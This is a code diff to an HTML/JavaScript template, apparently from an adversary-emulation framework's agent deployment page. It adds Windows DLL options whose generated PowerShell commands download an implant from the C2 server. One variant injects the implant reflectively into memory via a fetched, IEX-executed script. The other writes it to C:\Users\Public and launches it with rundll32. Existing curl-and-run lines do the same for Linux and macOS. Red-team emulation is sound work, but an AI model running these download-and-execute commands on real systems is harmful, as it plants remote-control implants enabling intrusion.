@@ -33,6 +33,8 @@
                                 <option value="linux">Linux</option>
                                 <option value="windows-psh">Windows (PowerShell)</option>
                                 <option value="windows-cmd">Windows (CMD)</option>
+                                <option value="windows-dll-mem">Windows DLL (In-Memory)</option>
+                                <option value="windows-dll-disk">Windows DLL (Disk)</option>
                             </select>
                             <button id="copyCommand" type="button" class="button-success"
                                     style="display:none">Copy Command</button>
@@ -80,7 +82,11 @@
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group -v;');
             } else if (selected_option === 'darwin') {
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
-            }
+            } else if(selected_option === 'windows-dll-mem') {
+ 				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $wc.Headers.add("defaultSleep","60"); $wc.Headers.add("defaultGroup","my_group"); $PEBytes = $wc.DownloadData($url); $wc1 = New-Object System.net.webclient; $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1"); IEX ($wc1.DownloadString($url)); Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId');
+  			} else if(selected_option === 'windows-dll-disk') {
+  				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $output="C:\\Users\\Public\\sandcat.dll"; $wc.DownloadFile($url,$output); rundll32.exe C:\\Users\\Public\\sandcat.dll,VoidFunc');
+  			}
             $('#copyCommand').show();
         }
         function openDuk1(){
